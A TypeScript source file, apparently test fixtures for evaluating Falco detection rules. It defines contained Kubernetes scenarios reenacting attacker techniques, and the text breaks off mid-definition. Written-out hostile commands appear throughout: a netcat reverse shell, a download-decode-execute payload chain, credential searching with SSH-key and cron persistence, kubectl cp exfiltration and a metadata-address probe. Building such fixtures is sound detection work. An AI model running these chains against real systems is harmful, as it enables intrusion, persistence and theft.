import type { ScenarioDraftDefinition } from './scenarioDraftDefinition.js';

const actionJob = (
  name: string,
  script: string,
  options: {
    image?: string;
    container?: Record<string, unknown>;
    podSpec?: Record<string, unknown>;
  } = {}
) => ({
  apiVersion: 'batch/v1',
  kind: 'Job',
  metadata: {
    name,
    labels: { 'evals.kubernetes.io/controlled-action': name },
  },
  spec: {
    backoffLimit: 1,
    template: {
      metadata: { labels: { app: name } },
      spec: {
        restartPolicy: 'Never',
        ...options.podSpec,
        containers: [
          {
            name: 'action',
            image: options.image ?? 'alpine:3.20',
            command: ['/bin/sh', '-ceu', script],
            ...options.container,
          },
        ],
      },
    },
  },
});

const service = (name: string, port: number, targetPort = port, type = 'ClusterIP') => ({
  apiVersion: 'v1',
  kind: 'Service',
  metadata: { name },
  spec: {
    selector: { app: name },
    ports: [{ name: 'action', port, targetPort }],
    type,
  },
});

const tcpSink = (name: string, port: number, response: string) => [
  service(name, port),
  {
    apiVersion: 'apps/v1',
    kind: 'Deployment',
    metadata: { name },
    spec: {
      replicas: 1,
      selector: { matchLabels: { app: name } },
      template: {
        metadata: { labels: { app: name } },
        spec: {
          containers: [
            {
              name: 'sink',
              image: 'alpine:3.20',
              command: [
                '/bin/sh',
                '-ceu',
                `while true; do printf '${response}\\n' | nc -l -p ${port}; done`,
              ],
              ports: [{ name: 'action', containerPort: port }],
            },
          ],
        },
      },
    },
  },
];

const hostConfiguration = (name: string, targetPath: string, key: string, value: string) => ({
  apiVersion: 'v1',
  kind: 'ConfigMap',
  metadata: {
    name,
    labels: { 'evals.kubernetes.io/fixture-kind': 'component-configuration' },
    annotations: {
      'evals.kubernetes.io/adapter': 'disposable-node',
      'evals.kubernetes.io/target-path': targetPath,
      'evals.kubernetes.io/apply-to-current-host': 'false',
    },
  },
  data: { [key]: value },
});

const runtimeProfiles: ScenarioDraftDefinition['supportedClusterProfiles'] = [
  'local-minikube',
  'aks',
];

export const advancedScenarioDraftDefinitions: ScenarioDraftDefinition[] = [
  {
    scenarioId: 'rule-gap-falco-privileged-host-filesystem-escape',
    title: 'Privileged container mounts and inspects host storage',
    description:
      'A controlled privileged Job creates an ext2 image, mounts only an emptyDir-backed tmpfs, and inspects the image with debugfs. No hostPath or host block device is exposed.',
    taskPrompt:
      'Inspect the `privileged-storage-action` Job specification and logs. Identify the privilege, mount, and filesystem-inspection chain, and cite the exact evidence without changing resources.',
    visibleResourceRefs: ['job/privileged-storage-action', 'pod/privileged-storage-action-*'],
    observationKinds: ['job.pod-template', 'pod.security-context', 'pod.logs'],
    setup: [
      actionJob(
        'privileged-storage-action',
        'apt-get update >/dev/null && apt-get install -y e2fsprogs mount >/dev/null\n' +
          'dd if=/dev/zero of=/workspace/controlled.img bs=1M count=8\n' +
          'mkfs.ext2 -F /workspace/controlled.img >/dev/null\n' +
          'mount -t tmpfs -o size=4m none /workspace/mnt\n' +
          'debugfs -R stats /workspace/controlled.img\n' +
          'umount /workspace/mnt',
        {
          image: 'debian:12-slim',
          container: {
            securityContext: { privileged: true, runAsUser: 0 },
            volumeMounts: [{ name: 'workspace', mountPath: '/workspace' }],
          },
          podSpec: { volumes: [{ name: 'workspace', emptyDir: {} }] },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'privileged-root-container',
        resource_ref: 'job/privileged-storage-action',
        field_path: 'spec.template.spec.containers[0].securityContext',
        observed_value: '{"privileged":true,"runAsUser":0}',
        description: 'The controlled action runs as root in a privileged container.',
      },
      {
        fact_id: 'mount-debugfs-chain',
        resource_ref: 'job/privileged-storage-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'mkfs.ext2; mount -t tmpfs; debugfs -R stats; umount',
        description: 'The command performs the mount and debugfs inspection chain.',
      },
      {
        fact_id: 'workspace-is-emptydir',
        resource_ref: 'job/privileged-storage-action',
        field_path: 'spec.template.spec.volumes[0].emptyDir',
        observed_value: '{}',
        description: 'All inspected storage is disposable Pod-local storage rather than the host.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-hostpath',
        resource_ref: 'job/privileged-storage-action',
        field_path: 'spec.template.spec.volumes[0].hostPath',
        observed_value: 'present',
        description: 'The fixture has no hostPath and does not expose a host block device.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-namespace-breakout',
    title: 'Container attempts namespace breakout',
    description:
      'A controlled Job invokes unshare and nsenter against PID 1 in its own Pod namespace. It exercises the namespace action chain without joining a host namespace.',
    taskPrompt:
      'Inspect the `namespace-action` Job and logs. Explain the namespace-changing operations and their boundary, citing the relevant Pod fields and command output.',
    visibleResourceRefs: ['job/namespace-action', 'pod/namespace-action-*'],
    observationKinds: ['job.pod-template', 'pod.process-namespace', 'pod.logs'],
    setup: [
      actionJob(
        'namespace-action',
        'apt-get update >/dev/null && apt-get install -y util-linux >/dev/null\n' +
          'unshare --user --map-root-user /bin/sh -c "id -u; mount | head -1" || true\n' +
          'nsenter --target 1 --mount -- /bin/true || true\n' +
          'printf "controlled-setns-target=pod-pid-1\\n"',
        {
          image: 'debian:12-slim',
          container: {
            securityContext: {
              allowPrivilegeEscalation: false,
              capabilities: { drop: ['ALL'] },
            },
          },
          podSpec: { shareProcessNamespace: true },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'unshare-then-nsenter',
        resource_ref: 'job/namespace-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'unshare --user --map-root-user; nsenter --target 1 --mount',
        description: 'The helper creates a user namespace and then invokes a setns-backed nsenter.',
      },
      {
        fact_id: 'no-sys-admin-capability',
        resource_ref: 'job/namespace-action',
        field_path: 'spec.template.spec.containers[0].securityContext.capabilities.drop',
        observed_value: '["ALL"]',
        description: 'The action does not receive CAP_SYS_ADMIN or another added capability.',
      },
      {
        fact_id: 'pod-local-setns-target',
        resource_ref: 'pod/namespace-action-*',
        field_path: 'logs[action]',
        observed_value: 'controlled-setns-target=pod-pid-1',
        description: 'The setns target is explicitly the Pod-local PID 1 process.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-host-pid',
        resource_ref: 'job/namespace-action',
        field_path: 'spec.template.spec.hostPID',
        observed_value: 'true',
        description: 'The Job does not enable hostPID and cannot target the host PID namespace.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-web-server-netcat-reverse-shell',
    title: 'Web server launches a netcat reverse shell',
    description:
      'A BusyBox HTTP CGI endpoint launches a shell-backed netcat connection to a namespace-local callback Service that supplies one fixed harmless command.',
    taskPrompt:
      'Trace the process and network chain from `web-trigger` through `controlled-web` to `callback`. Cite the CGI command and callback boundary without mutating resources.',
    visibleResourceRefs: [
      'configmap/controlled-web-cgi',
      'deployment/controlled-web',
      'service/controlled-web',
      'deployment/callback',
      'service/callback',
      'job/web-trigger',
    ],
    observationKinds: [
      'configmap.data',
      'deployment.pod-template',
      'service.endpoints',
      'pod.logs',
    ],
    setup: [
      ...tcpSink('callback', 9000, 'printf controlled-callback; exit'),
      {
        apiVersion: 'v1',
        kind: 'ConfigMap',
        metadata: { name: 'controlled-web-cgi' },
        data: {
          action:
            '#!/bin/sh\nprintf "Content-Type: text/plain\\n\\n"\nnc callback 9000 -e /bin/sh\n',
        },
      },
      {
        apiVersion: 'apps/v1',
        kind: 'Deployment',
        metadata: { name: 'controlled-web' },
        spec: {
          replicas: 1,
          selector: { matchLabels: { app: 'controlled-web' } },
          template: {
            metadata: { labels: { app: 'controlled-web' } },
            spec: {
              initContainers: [
                {
                  name: 'install-cgi',
                  image: 'alpine:3.20',
                  command: [
                    '/bin/sh',
                    '-ceu',
                    'cp /source/action /www/cgi-bin/action && chmod 0755 /www/cgi-bin/action',
                  ],
                  volumeMounts: [
                    { name: 'cgi-source', mountPath: '/source' },
                    { name: 'www', mountPath: '/www' },
                  ],
                },
              ],
              containers: [
                {
                  name: 'httpd',
                  image: 'alpine:3.20',
                  command: ['httpd', '-f', '-p', '8080', '-h', '/www'],
                  ports: [{ name: 'http', containerPort: 8080 }],
                  volumeMounts: [{ name: 'www', mountPath: '/www' }],
                },
              ],
              volumes: [
                { name: 'cgi-source', configMap: { name: 'controlled-web-cgi' } },
                { name: 'www', emptyDir: {} },
              ],
            },
          },
        },
      },
      service('controlled-web', 8080),
      actionJob(
        'web-trigger',
        'until wget -qO- http://controlled-web:8080/cgi-bin/action; do sleep 1; done'
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'httpd-cgi-shell-netcat',
        resource_ref: 'configmap/controlled-web-cgi',
        field_path: 'data.action',
        observed_value: 'nc callback 9000 -e /bin/sh',
        description: 'The HTTP CGI shell launches netcat with a shell execution option.',
      },
      {
        fact_id: 'controlled-callback-service',
        resource_ref: 'service/callback',
        field_path: 'spec.ports[0].port',
        observed_value: '9000',
        description: 'The callback destination is a namespace-local controlled Service.',
      },
      {
        fact_id: 'callback-fixed-command',
        resource_ref: 'deployment/callback',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'printf controlled-callback; exit',
        description: 'The listener sends one fixed command and immediately terminates the shell.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-external-callback',
        resource_ref: 'service/callback',
        field_path: 'spec.type',
        observed_value: 'LoadBalancer',
        description: 'The callback is ClusterIP-only and has no external listener.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet', 'cni'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-staged-payload-installation',
    title: 'Downloaded payload is decoded, staged, and installed',
    description:
      'A Job downloads a base64-encoded harmless script from a namespace-local HTTP Service, stages and executes it from /dev/shm, then moves it into a disposable binary directory.',
    taskPrompt:
      'Inspect `payload-server` and `payload-stager`, then identify the complete download, decode, execute, and install sequence using manifest and log evidence.',
    visibleResourceRefs: [
      'configmap/controlled-payload',
      'deployment/payload-server',
      'service/payload-server',
      'job/payload-stager',
    ],
    observationKinds: ['configmap.data', 'job.pod-template', 'service.endpoints', 'pod.logs'],
    setup: [
      {
        apiVersion: 'v1',
        kind: 'ConfigMap',
        metadata: { name: 'controlled-payload' },
        data: { 'payload.b64': 'IyEvYmluL3NoCnByaW50ZiAiY29udHJvbGxlZC1wYXlsb2FkXG4iCg==' },
      },
      {
        apiVersion: 'apps/v1',
        kind: 'Deployment',
        metadata: { name: 'payload-server' },
        spec: {
          replicas: 1,
          selector: { matchLabels: { app: 'payload-server' } },
          template: {
            metadata: { labels: { app: 'payload-server' } },
            spec: {
              containers: [
                {
                  name: 'server',
                  image: 'python:3.12-alpine',
                  command: ['python3', '-m', 'http.server', '8080', '--directory', '/payload'],
                  ports: [{ name: 'http', containerPort: 8080 }],
                  volumeMounts: [{ name: 'payload', mountPath: '/payload' }],
                },
              ],
              volumes: [{ name: 'payload', configMap: { name: 'controlled-payload' } }],
            },
          },
        },
      },
      service('payload-server', 8080),
      actionJob(
        'payload-stager',
        'wget -qO /dev/shm/.payload.b64 http://payload-server:8080/payload.b64\n' +
          'base64 -d /dev/shm/.payload.b64 > /dev/shm/.payload\n' +
          'chmod 0700 /dev/shm/.payload\n' +
          '/dev/shm/.payload\n' +
          'mkdir -p /controlled-bin/tools\n' +
          'mv /dev/shm/.payload /controlled-bin/tools/controlled-payload',
        {
          container: { volumeMounts: [{ name: 'controlled-bin', mountPath: '/controlled-bin' }] },
          podSpec: { volumes: [{ name: 'controlled-bin', emptyDir: {} }] },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'download-decode-execute-install',
        resource_ref: 'job/payload-stager',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value:
          'wget -qO /dev/shm/.payload.b64; base64 -d /dev/shm/.payload.b64; chmod 0700 /dev/shm/.payload; /dev/shm/.payload; mv /dev/shm/.payload /controlled-bin/tools/controlled-payload',
        description:
          'One command chain downloads, decodes, marks executable, runs, and installs the file.',
      },
      {
        fact_id: 'payload-is-harmless-script',
        resource_ref: 'configmap/controlled-payload',
        field_path: 'data.payload.b64',
        observed_value: '#!/bin/sh\nprintf "controlled-payload\\n"\n',
        description: 'The decoded payload only prints a fixed marker.',
      },
      {
        fact_id: 'install-target-is-emptydir',
        resource_ref: 'job/payload-stager',
        field_path: 'spec.template.spec.volumes[0].emptyDir',
        observed_value: '{}',
        description: 'The installed file remains in disposable Pod-local storage.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-host-install',
        resource_ref: 'job/payload-stager',
        field_path: 'spec.template.spec.volumes[0].hostPath',
        observed_value: 'present',
        description: 'No host binary directory is mounted or modified.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet', 'cni'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-gpu-cryptominer',
    title: 'GPU cryptominer profiles hardware and joins a pool',
    description:
      'A controlled Job reads a fake GPU device, runs local nvidia-smi and xmrig fixtures, and sends a Stratum greeting only to a namespace-local pool Service.',
    taskPrompt:
      'Inspect `gpu-tools`, `miner-pool`, and `gpu-miner-action`. Identify the GPU-query, device-access, miner-process, and Stratum connection evidence and its controlled boundary.',
    visibleResourceRefs: [
      'configmap/gpu-tools',
      'deployment/miner-pool',
      'service/miner-pool',
      'job/gpu-miner-action',
    ],
    observationKinds: ['configmap.data', 'job.pod-template', 'service.endpoints', 'pod.logs'],
    setup: [
      ...tcpSink('miner-pool', 3333, 'controlled-stratum-response'),
      {
        apiVersion: 'v1',
        kind: 'ConfigMap',
        metadata: { name: 'gpu-tools' },
        data: {
          'nvidia-smi': '#!/bin/sh\ncat /controlled-dev/nvidia0\n',
          xmrig:
            '#!/bin/sh\nprintf "{\\"method\\":\\"mining.subscribe\\"}\\n" | nc miner-pool 3333\n',
        },
      },
      actionJob(
        'gpu-miner-action',
        'printf "controlled-gpu-device\\n" > /controlled-dev/nvidia0\n' +
          '/tools/nvidia-smi\n' +
          '/tools/xmrig --url stratum+tcp://miner-pool:3333',
        {
          container: {
            volumeMounts: [
              { name: 'tools', mountPath: '/tools' },
              { name: 'controlled-dev', mountPath: '/controlled-dev' },
            ],
          },
          podSpec: {
            volumes: [
              { name: 'tools', configMap: { name: 'gpu-tools', defaultMode: 493 } },
              { name: 'controlled-dev', emptyDir: {} },
            ],
          },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'gpu-query-and-miner-process',
        resource_ref: 'job/gpu-miner-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: '/tools/nvidia-smi; /tools/xmrig --url stratum+tcp://miner-pool:3333',
        description: 'The action invokes GPU-query and miner-named executables in order.',
      },
      {
        fact_id: 'fake-gpu-device-read',
        resource_ref: 'configmap/gpu-tools',
        field_path: 'data.nvidia-smi',
        observed_value: 'cat /controlled-dev/nvidia0',
        description: 'The GPU query reads only an emptyDir-backed synthetic device file.',
      },
      {
        fact_id: 'controlled-stratum-destination',
        resource_ref: 'service/miner-pool',
        field_path: 'spec.ports[0].port',
        observed_value: '3333',
        description: 'Stratum traffic terminates at the namespace-local miner-pool Service.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-physical-gpu',
        resource_ref: 'job/gpu-miner-action',
        field_path: 'spec.template.spec.containers[0].resources.limits.nvidia.com/gpu',
        observed_value: '1',
        description: 'The Job requests no physical GPU and mounts no host device.',
      },
      {
        fact_id: 'invented-external-pool',
        resource_ref: 'service/miner-pool',
        field_path: 'spec.type',
        observed_value: 'LoadBalancer',
        description: 'The controlled pool is not externally reachable.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet', 'cni'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-credential-search-ssh-persistence',
    title: 'Credential search leads to SSH-key persistence',
    description:
      'A Job seeds fake credentials in an emptyDir, searches and reads them, then appends a synthetic public key to an emptyDir-backed authorized_keys file.',
    taskPrompt:
      'Inspect the `credential-search-action` init and action containers and logs. Identify the search, read, and authorized_keys write sequence and prove that it is fixture-scoped.',
    visibleResourceRefs: ['job/credential-search-action', 'pod/credential-search-action-*'],
    observationKinds: ['job.pod-template', 'pod.init-container-status', 'pod.logs'],
    setup: [
      actionJob(
        'credential-search-action',
        'find /fixture -type f -name "id_*" -o -name "credentials"\n' +
          'grep -R "CONTROLLED_SECRET" /fixture\n' +
          'cat /fixture/home/.ssh/id_ed25519\n' +
          'printf "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICONTROLLED scenario@invalid\\n" >> /fixture/home/.ssh/authorized_keys\n' +
          'tail -1 /fixture/home/.ssh/authorized_keys',
        {
          container: { volumeMounts: [{ name: 'fixture', mountPath: '/fixture' }] },
          podSpec: {
            initContainers: [
              {
                name: 'seed',
                image: 'alpine:3.20',
                command: [
                  '/bin/sh',
                  '-ceu',
                  'mkdir -p /fixture/home/.ssh /fixture/home/.aws; printf CONTROLLED_SECRET > /fixture/home/.ssh/id_ed25519; printf "token=CONTROLLED_SECRET\\n" > /fixture/home/.aws/credentials',
                ],
                volumeMounts: [{ name: 'fixture', mountPath: '/fixture' }],
              },
            ],
            volumes: [{ name: 'fixture', emptyDir: {} }],
          },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'credential-search-read-write-chain',
        resource_ref: 'job/credential-search-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value:
          'find /fixture; grep -R "CONTROLLED_SECRET" /fixture; cat /fixture/home/.ssh/id_ed25519; /fixture/home/.ssh/authorized_keys',
        description:
          'The action searches credentials, reads a private-key fixture, and writes authorized_keys.',
      },
      {
        fact_id: 'synthetic-credential-seed',
        resource_ref: 'job/credential-search-action',
        field_path: 'spec.template.spec.initContainers[0].command[2]',
        observed_value: 'CONTROLLED_SECRET',
        description: 'All searched credential material is synthetic and seeded by the Job.',
      },
      {
        fact_id: 'credential-storage-is-emptydir',
        resource_ref: 'job/credential-search-action',
        field_path: 'spec.template.spec.volumes[0].emptyDir',
        observed_value: '{}',
        description: 'The SSH and credential tree is disposable Pod-local storage.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-real-secret',
        resource_ref: 'job/credential-search-action',
        field_path: 'spec.template.spec.volumes[0].secret',
        observed_value: 'present',
        description: 'No Kubernetes Secret or host credential directory is mounted.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-shell-profile-persistence',
    title: 'Non-shell process modifies the root shell profile',
    description:
      'A Python helper reads and appends a fixed marker to /root/.bashrc, where /root is backed by an emptyDir rather than the image or host filesystem.',
    taskPrompt:
      'Inspect `shell-profile-action` and its logs. Identify the non-shell process and exact profile read/write operations, including the storage boundary.',
    visibleResourceRefs: ['job/shell-profile-action', 'pod/shell-profile-action-*'],
    observationKinds: ['job.pod-template', 'pod.logs'],
    setup: [
      actionJob(
        'shell-profile-action',
        'python3 -c \'profile="/root/.bashrc"; open(profile,"w").write("export BASELINE=1\\n"); print(open(profile).read(),end=""); open(profile,"a").write("printf controlled-profile\\n"); print(open(profile).read(),end="")\'',
        {
          image: 'python:3.12-alpine',
          container: {
            volumeMounts: [{ name: 'root-home', mountPath: '/root' }],
          },
          podSpec: { volumes: [{ name: 'root-home', emptyDir: {} }] },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'python-reads-and-writes-bashrc',
        resource_ref: 'job/shell-profile-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'python3 -c; profile="/root/.bashrc"; open(profile,"a").write',
        description:
          'A Python process, rather than a shell editor, reads and appends to root .bashrc.',
      },
      {
        fact_id: 'root-home-is-emptydir',
        resource_ref: 'job/shell-profile-action',
        field_path: 'spec.template.spec.volumes[0].emptyDir',
        observed_value: '{}',
        description: 'The modified root home exists only for the Pod lifetime.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-host-root-home',
        resource_ref: 'job/shell-profile-action',
        field_path: 'spec.template.spec.volumes[0].hostPath.path',
        observed_value: '/root',
        description: 'The host root home is not mounted.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-cron-persistence',
    title: 'Process installs a cron persistence file',
    description:
      'A controlled Job writes an executable cron entry below /etc/cron.d, with that directory replaced by an emptyDir so no node or image cron configuration persists.',
    taskPrompt:
      'Inspect `cron-persistence-action` and its logs. Identify the exact cron file creation and executable command, and establish where the file is stored.',
    visibleResourceRefs: ['job/cron-persistence-action', 'pod/cron-persistence-action-*'],
    observationKinds: ['job.pod-template', 'pod.logs'],
    setup: [
      actionJob(
        'cron-persistence-action',
        'printf "* * * * * root printf controlled-cron\\n" > /etc/cron.d/controlled-action\n' +
          'chmod 0600 /etc/cron.d/controlled-action\n' +
          'cat /etc/cron.d/controlled-action',
        {
          container: { volumeMounts: [{ name: 'cron', mountPath: '/etc/cron.d' }] },
          podSpec: { volumes: [{ name: 'cron', emptyDir: {} }] },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'cron-entry-created',
        resource_ref: 'job/cron-persistence-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: '* * * * * root printf controlled-cron',
        description: 'The process creates a valid cron entry under /etc/cron.d.',
      },
      {
        fact_id: 'cron-directory-is-emptydir',
        resource_ref: 'job/cron-persistence-action',
        field_path: 'spec.template.spec.volumes[0].emptyDir',
        observed_value: '{}',
        description: 'The cron directory is isolated disposable storage.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-host-cron-write',
        resource_ref: 'job/cron-persistence-action',
        field_path: 'spec.template.spec.volumes[0].hostPath.path',
        observed_value: '/etc/cron.d',
        description: 'The Job does not mount or modify the host cron directory.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-in-cluster-kubectl-exfiltration',
    title: 'In-cluster kubectl copies data from another Pod',
    description:
      'A dedicated ServiceAccount with namespace-scoped Pod read and exec rights runs kubectl cp against a victim Pod containing a synthetic artifact.',
    taskPrompt:
      'Trace `kubectl-copy-action` access to `copy-victim`. Cite the ServiceAccount token policy, RBAC grant, kubectl command, and copied artifact evidence.',
    visibleResourceRefs: [
      'serviceaccount/copy-client',
      'role/copy-client',
      'rolebinding/copy-client',
      'pod/copy-victim',
      'job/kubectl-copy-action',
    ],
    observationKinds: ['rbac.rules', 'pod.service-account', 'job.pod-template', 'pod.logs'],
    setup: [
      { apiVersion: 'v1', kind: 'ServiceAccount', metadata: { name: 'copy-client' } },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1',
        kind: 'Role',
        metadata: { name: 'copy-client' },
        rules: [
          { apiGroups: [''], resources: ['pods'], verbs: ['get'] },
          { apiGroups: [''], resources: ['pods/exec'], verbs: ['create'] },
        ],
      },
      {
        apiVersion: 'rbac.authorization.k8s.io/v1',
        kind: 'RoleBinding',
        metadata: { name: 'copy-client' },
        subjects: [{ kind: 'ServiceAccount', name: 'copy-client' }],
        roleRef: {
          apiGroup: 'rbac.authorization.k8s.io',
          kind: 'Role',
          name: 'copy-client',
        },
      },
      {
        apiVersion: 'v1',
        kind: 'Pod',
        metadata: { name: 'copy-victim', labels: { app: 'copy-victim' } },
        spec: {
          containers: [
            {
              name: 'victim',
              image: 'alpine:3.20',
              command: [
                '/bin/sh',
                '-ceu',
                'mkdir -p /data; printf controlled-artifact > /data/artifact; sleep 3600',
              ],
            },
          ],
        },
      },
      actionJob(
        'kubectl-copy-action',
        'until kubectl get pod copy-victim -o jsonpath="{.status.phase}" | grep -q Running; do sleep 1; done\n' +
          'kubectl cp copy-victim:/data/artifact /tmp/artifact\n' +
          'cat /tmp/artifact',
        {
          image: 'alpine/k8s:1.31.1',
          podSpec: { serviceAccountName: 'copy-client', automountServiceAccountToken: true },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'service-account-token-mounted',
        resource_ref: 'job/kubectl-copy-action',
        field_path: 'spec.template.spec.automountServiceAccountToken',
        observed_value: 'true',
        description: 'The kubectl Job explicitly mounts its dedicated ServiceAccount token.',
      },
      {
        fact_id: 'pod-exec-authorized',
        resource_ref: 'role/copy-client',
        field_path: 'rules[1]',
        observed_value: '{"apiGroups":[""],"resources":["pods/exec"],"verbs":["create"]}',
        description: 'Namespace-scoped RBAC allows the exec operation used by kubectl cp.',
      },
      {
        fact_id: 'kubectl-copy-command',
        resource_ref: 'job/kubectl-copy-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'kubectl cp copy-victim:/data/artifact /tmp/artifact',
        description: 'Kubectl copies the synthetic victim artifact through the API server.',
      },
      {
        fact_id: 'copied-synthetic-artifact',
        resource_ref: 'pod/kubectl-copy-action-*',
        field_path: 'logs[action]',
        observed_value: 'controlled-artifact',
        description: 'The copied data is the fixed synthetic artifact.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-cluster-admin',
        resource_ref: 'rolebinding/copy-client',
        field_path: 'roleRef.name',
        observed_value: 'cluster-admin',
        description: 'The ServiceAccount has only the two namespace-scoped permissions required.',
      },
      {
        fact_id: 'invented-secret-copy',
        resource_ref: 'pod/copy-victim',
        field_path: 'spec.volumes[*].secret',
        observed_value: 'present',
        description: 'The victim mounts no Secret and contains only generated test data.',
      },
    ],
    requiredMechanisms: ['api-server', 'authorization', 'kubelet'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-ec2-metadata-access',
    title: 'Container contacts the instance metadata address',
    description:
      'A NET_ADMIN-capable Job assigns 169.254.169.254 to its own loopback device, starts a local HTTP listener, and contacts that address without reaching a cloud metadata service.',
    taskPrompt:
      'Inspect `metadata-address-action` and its logs. Identify the link-local destination and prove whether it is real metadata or a controlled Pod-local endpoint.',
    visibleResourceRefs: ['job/metadata-address-action', 'pod/metadata-address-action-*'],
    observationKinds: ['job.pod-template', 'pod.network', 'pod.logs'],
    setup: [
      actionJob(
        'metadata-address-action',
        'ip address add 169.254.169.254/32 dev lo\n' +
          'printf "HTTP/1.1 200 OK\\r\\nContent-Length: 19\\r\\n\\r\\ncontrolled-metadata" | nc -l -p 8080 &\n' +
          'sleep 1\n' +
          'wget -qO- http://169.254.169.254:8080/latest/meta-data/',
        {
          image: 'nicolaka/netshoot:v0.13',
          container: {
            securityContext: {
              allowPrivilegeEscalation: false,
              capabilities: { add: ['NET_ADMIN'], drop: ['ALL'] },
            },
          },
        }
      ),
    ],
    acceptedFacts: [
      {
        fact_id: 'link-local-metadata-request',
        resource_ref: 'job/metadata-address-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'http://169.254.169.254:8080/latest/meta-data/',
        description: 'The application makes an HTTP request to the metadata link-local address.',
      },
      {
        fact_id: 'loopback-alias-precedes-request',
        resource_ref: 'job/metadata-address-action',
        field_path: 'spec.template.spec.containers[0].command[2]',
        observed_value: 'ip address add 169.254.169.254/32 dev lo',
        description:
          'The address is first assigned to Pod loopback, making the endpoint controlled.',
      },
      {
        fact_id: 'controlled-metadata-response',
        resource_ref: 'pod/metadata-address-action-*',
        field_path: 'logs[action]',
        observed_value: 'controlled-metadata',
        description: 'The response proves the connection terminated at the local fixture listener.',
      },
    ],
    contradictionFacts: [
      {
        fact_id: 'invented-cloud-credential-response',
        resource_ref: 'pod/metadata-address-action-*',
        field_path: 'logs[action]',
        observed_value: 'AccessKeyId',
        description: 'The fixture returns no cloud identity or credential material.',
      },
    ],
    requiredMechanisms: ['api-server', 'kubelet', 'cni'],
    supportedClusterProfiles: runtimeProfiles,
  },
  {
    scenarioId: 'rule-gap-falco-interactive-container-network-recon',
    title: 'Interactive Python scanner probes cluster and external networks',
    description:
      'A TTY-enabled Python Pod opens AF_PACKET and sends UDP probes to a ClusterIP and a NodePort backed by one controlled responder; no Internet endpoint is contacted.',
    taskPrompt:
      'Inspect `recon-responder`, `recon-nodeport`, and `interactive-recon`. Identify the interactive shell, packet socket, and both UDP probe destinations from exact evidence.',
    visibleResourceRefs: [
      'deployment/recon-responder',
      'service/recon-responder',
      'service/recon-nodeport',
      'pod/interactive-recon',
    ],
    observationKinds: ['pod.spec', 'pod.logs', 'service.ports', 'service.endpoints'],
    setup: [
      {
        apiVersion: 'apps/v1',
        kind: 'Deployment',
        metadata: { name: 'recon-responder' },
        spec: {
          replicas: 1,
          selector: { matchLabels: { app: 'recon-responder' } },
          template: {
            metadata: { labels: { app: 'recon-responder' } },
            spec: {
              containers: [
                {
                  name: 'udp',
                  image: 'alpine:3.20',
                  command: [
                    '/bin/sh',
                    '-ceu',
                    'while true; do printf controlled-udp | nc -u -l -p 9999; done',
                  ],
                  ports: [{ name: 'udp', containerPort: 9999, protocol: 'UDP' }],
                },
              ],
            },
          },
        },
      },
      {
        ...service('recon-responder', 9999),
        spec: {
          selector: { app: 'recon-responder' },
          ports: [{ name: 'udp', port: 9999, targetPort: 9999, protocol: 'UDP' }],
          type: 'ClusterIP',
        },
      },
      {
        apiVersion: 'v1',
        kind: 'Service',
        metadata: { name: 'recon-nodeport' },
        spec: {
          selector: { app: 'recon-responder' },
          ports: [{ name: 'udp', port: 9999, targetPort: 9999, protocol: 'UDP', nodePort: 30099 }],
          type: 'NodePort',
        },
      },
      {
        apiVersion: 'v1',
        kind: 'Pod',
        metadata: { name: 'interactive-recon', labels: { app: 'interactive-recon' } },
        spec: {
          containers: [
            {
              name: 'scanner',
              image: 'python:3.12-alpine',
              stdin: true,
              tty: true,
              securityContext: {
                allowPrivilegeEscalation: false,
